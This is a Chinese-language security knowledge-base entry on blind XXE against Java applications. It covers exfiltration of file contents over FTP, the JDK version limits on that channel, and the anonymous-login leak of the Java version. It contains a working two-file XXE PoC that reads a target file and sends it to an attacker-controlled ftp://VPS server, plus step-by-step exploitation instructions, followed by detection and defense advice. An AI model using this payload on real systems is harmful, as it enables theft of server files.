---
id: web-generic-xxe-java-ftp-oob-jdk-version
title: Java XXE 盲外带选 FTP：HTTP handler 拒绝 URL 换行，FTP 受 JDK 版本限制且匿名登录泄露 Java 版本
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-java-ftp-oob-jdk-version
aliases:
- Java XXE FTP 外带
- XXE ftp 外带
- 匿名 FTP 泄露 Java 版本
- checkURL Illegal character in URL
- Java XXE 换行限制
- FTP 盲 XXE
tags:
- xxe
- java
- ftp
- oob
- exfiltration
- blind-xxe
- jdk
- version-detection
- newline
cve: []
severity: high
confidence: medium
affected_versions: JDK <7u141-b00 / <8u131-b09 不受文件内换行影响；> jdk8u131 能建连但内容含换行抛异常；> jdk8u232 URL 含换行无法建连（原文标记；原文另处写 <7u141 和 <8u162）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V371
  verified_at: '2026-11-09T05:53:41+08:00'
  notes: 已对照原文核对；图07/08 的 sun.net.www.protocol.http.HttpURLConnection.checkURL 与 toExternalForm().indexOf(10) 证据、FTP 匿名 PASS 泄露 Java1.7.0_21@ 日志与原文一致；affected_versions 按原文两处表述（<7u141/<8u162 与 <7u141-b00/<8u131-b09、>8u131、>8u232）核对后修正为带原文歧义标注；未实际启动 FTP 复现
---

## 一句话结论

Java 盲 XXE 用参数实体把文件内容拼进外带 URL 时，HTTP handler 只要 URL 中出现换行（字节 10）就抛 `MalformedURLException: Illegal character in URL`，而旧版 JDK 的 FTP handler 允许换行随路径发到攻击者 FTP 日志，因此多行文件优先用 `ftp://` 外带；FTP 外带能力随 JDK 版本收紧，且 Java FTP 客户端匿名登录时会把 Java 版本写进 `PASS` 字段，可反向确认目标 JDK 版本。

## 原理

- **盲 XXE 外带的通道是 URL**：外部参数实体 `<!ENTITY % file SYSTEM "file:///目标文件">` 读出文件内容后，把它嵌入另一个实体的 SYSTEM URL（如 `http://attacker/%file;` 或 `ftp://attacker/%file;`），解析器发起请求时文件内容就出现在 URL 路径里，攻击者从服务端日志读取。
- **HTTP handler 拒绝换行**：Java `sun.net.www.protocol.http.HttpURLConnection.checkURL` 对 URL 的 `toExternalForm()` 做检查，`indexOf(10) > -1`（出现换行字节）即抛 `MalformedURLException("Illegal character in URL")`。绝大多数文本文件含换行，因此 HTTP 外带只能可靠处理单行内容（或需先把换行编码掉，但 XXE 里无法做变换）。
- **FTP handler 的差异**：旧版 JDK 的 `sun.net.www.protocol.ftp` 没有同样的换行检查，文件内容（含 `\n`）可以进入 FTP 命令路径，客户端用 `RETR <路径>` 时把内容发给攻击者控制的 FTP 服务器，形成外带。这就是“Java 站优先用 ftp 协议读文件/外带”的原因。
- **版本收紧**：FTP 外带并非所有 JDK 都可用——原文给出 `<7u141`、`<8u162` 可读整个文件的边界，并转述更细的总结：`<7u141-b00` 或 `<8u131-b09` 不受文件内 `\n` 影响；高于 `jdk8u131` 能建立 FTP 连接但内容含 `\n` 时抛异常；`jdk8u232` 之后 URL 含 `\n` 即无法建立连接。具体以 update build 实测为准。
- **匿名 FTP 泄露 JDK 版本**：URL 不指定用户名口令时，Java FTP 客户端以 `anonymous` 登录，密码默认是 Java 版本串（如 `Java1.7.0_21@`）。攻击者 FTP 服务端日志里的 `USER anonymous` / `PASS Java1.7.0_21@` 直接给出目标 JDK 版本，用于判断该目标是否还能走 FTP 外带。
- **特殊字符限制**：`\r` 会被替换成 `\n`；内容含 `%`、`&` 会直接出错；含单双引号可部分绕过；`?` 对 HTTP 无影响但会截断 FTP；`/` 在 FTP 需要额外的解析处理；`#` 会造成截断。外带前应了解目标文件内容形态。

## 触发条件

- 目标为 Java 应用，存在盲 XXE（无回显）且解析器允许外部参数实体与外部 DTD。
- 目标可出网到攻击者控制的 FTP 服务（或可被中间人看到 FTP 流量）。
- JDK 版本处于允许换行进入 FTP 路径的范围；高版本需改用单行文件、DNS/错误回显等通道。
- 攻击者能启动并记录 FTP 会话（自建 pyftpdlib/vsftpd 等）。

## 利用步骤

1. 在 VPS 启动带日志的 FTP 服务（如 `python3 -m pyftpdlib -p 2121`），记录 `USER/PASS/RETR`。
2. 托管第一步 XML（或直接提交）：用 `%include;` 引入远程 DTD，再执行 `%define_ftp;%send_ftp;`。
3. 远程 DTD 中定义 `%file;` 读取目标文件，并用 `&#37;`（`%` 的 HTML 编码，实体值内不能直接写 `%`）构造 `%send_ftp;`，其 SYSTEM 为 `ftp://VPS:2121/%file;`。
4. 提交 XML 后观察 FTP 日志：`PASS` 字段得到 Java 版本，`RETR` 路径中得到文件内容（换行可能出现在日志行内）。
5. 若内容含换行导致失败或版本过高，改用单行文件（如 `/etc/hostname`）或 HTTP/DNS/错误回显通道。
6. 对外带内容做拼接还原（按日志顺序与分隔符）。

## PoC

step1.xml（提交给目标）：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE xdsec[
        <!ENTITY % include SYSTEM "http://VPS/step2.dtd">
        %include;
        %define_ftp;%send_ftp;
]>
<books></books>
```

step2.dtd（托管在 VPS）：

```xml
<!ENTITY % file SYSTEM "file:///目标文件">
<!ENTITY % define_ftp "<!ENTITY &#37; send_ftp SYSTEM 'ftp://VPS:2121/%file;'>">
```

FTP 日志中可见：

```text
USER anonymous
PASS Java1.7.0_21@
RETR <文件内容>
```

## 变体与关联

- **HTTP 外带**：仅适合无换行内容；Java 高版本 HTTP/URL 检查更严格。
- **DNS 外带**：把内容编码进主机名，受标签长度/字符集限制，适合短数据。
- **错误回显**：有报错回显时可不依赖出网，见本地 DTD 报错回显手法。
- **通用 OOB**：参数实体 + 外部 DTD 的基础链见 [[web-generic-xxe-oob-exfil]]；有回显文件读取见 [[web-generic-xxe-inband-file-read-default-insecure]]。
- **边界**：目标 JDK 版本过高、FTP 出网被防火墙阻断、解析器禁用外部参数实体、或文件含 `%`/`&` 等特殊字符时，该通道失败。

## 检测与防御

- **禁用外部实体**：`DocumentBuilderFactory` 设置 `disallow-doctype-decl=true`，或禁用 `external-parameter-entities`/`external-general-entities` 并关闭 `FEATURE_SECURE_PROCESSING` 相关危险默认。
- **出网管控**：服务器不应主动外连任意 FTP/HTTP；限制出站端口与目标，监控 Java 进程发起的 FTP 会话。
- **检测**：Web 日志中的 XXE 特征 DTD/参数实体；主机侧 Java 进程向外部 21 端口发起连接；FTP 服务端出现 `USER anonymous` 且 `PASS` 为 Java 版本串；`RETR` 路径含敏感文件内容。
- **响应**：封禁外连、排查被读文件、修补 XML 解析器配置。
